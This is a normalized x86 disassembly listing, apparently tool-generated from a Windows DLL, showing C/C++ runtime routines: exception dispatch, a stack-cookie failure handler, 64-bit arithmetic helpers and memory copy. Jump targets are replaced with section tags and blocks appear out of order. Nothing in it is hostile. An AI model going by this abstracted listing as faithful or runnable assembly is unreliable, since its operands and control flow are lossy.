sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_10031719
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1002a434
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1002a757
push 0x2c
push r--data
call sub_1002ca38
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_100280fe
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1002bd74
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1002bd74
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1002bd74
mov [ eax + 0x88 ] esi
call sub_1002bd74
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_100281a3
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1002a87d
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_1002a7f0
mov esp [ ebp - 0x18 ]
call sub_1002bd74
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1002a4dc
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1002a87d
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1002a87d
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10028151
pop ecx
call sub_1002bd74
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1002bd74
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1002812a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1002a602
pop ecx
pop ecx
sub_1002a8f3
push 0xc
push r--data
call sub_1002ca38
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10031719
push ebx
push esi
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_100348e5
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1002b740
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_100348e5
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1002a657
pop ecx
pop ecx
push eax
push esi
call sub_1002b740
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1002ca7d
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1002a657
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1002aa72
push 0x8
push r--data
call sub_1002ca38
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1002a657
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10027e4f
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1002a8f3
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ca7d
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1002a657
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10027e4f
jmp r-xdata
sub_1002ab04
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1002aa72
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10027e1d
call sub_10027e56
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1002a4dc
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1002a757
add esp 0x28
test eax eax
je r-xdata
sub_1002ab72
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1002bd74
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1002bd74
lea edi [ eax + 0x80 ]
call sub_1002bb1f
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10028089
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_10031719
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10027f13
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002ab04
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_1002ac66
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_10031719
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1002bd74
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10031719
call sub_100316cd
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002ab72
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1002bd74
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1002bd74
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1002bd74
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_100348e5
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10028089
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_10031719
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1002a602
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_1002bd74
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_1002bd74
mov edi [ eax + 0x94 ]
call sub_1002bd74
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1002a693
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1002a693
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_100245ae
test al al
jne r-xdata
call sub_10031719
cmp eax 0x19930522
jne r-xdata
call sub_1002bd74
call sub_1002bd74
call sub_1002bd74
mov [ eax + 0x88 ] esi
call sub_1002bd74
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_1002a434
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1002a602
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1002a3e4
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10027dd1
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1002ab04
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_10027e56
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1002a4dc
add esp 0x10
push [ esi + 0x1c ]
call sub_1002a70e
sub_1002afca
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002bd74
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1002ac66
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1002a4dc
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1002b0b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10027728
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1002972b
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100348f7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10031499
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10029f92
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002b1c5
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002b0b0
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1002b200
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1002b270
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1002b327
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
mov esi ebx
call sub_10027728
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1002972b
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1002480c
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_10031499
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
push esi
call sub_10024630
pop ecx
push eax
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_100354b0
add esp 0x18
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x8 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x8 ]
fldz
fcom [ ecx + 0x10 ]
fnstsw ax
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x8 ]
call sub_1002972b
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_1002b45d
push 0xc
push r--data
call sub_1002ca38
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_1002ca7d
retn
call sub_10030399
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_1002972b
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_10035557
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b519
mov eax [ ebp - 0x1c ]
call sub_1002972b
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_100304d4
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1002b523
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1002baa5
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1002baa5
pop ecx
sub_1002b638
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1002bb28
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1002b660
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002b6c8
push 0xc
push r--data
call sub_1002ca38
push 0xe
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b72f
call sub_1002ca7d
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10024aba
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10024aba
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1002b740
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1002b7c8 ]
jmp [ ecx * 4 + jump_table_1002b848 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002b8b4 ]
pop esi
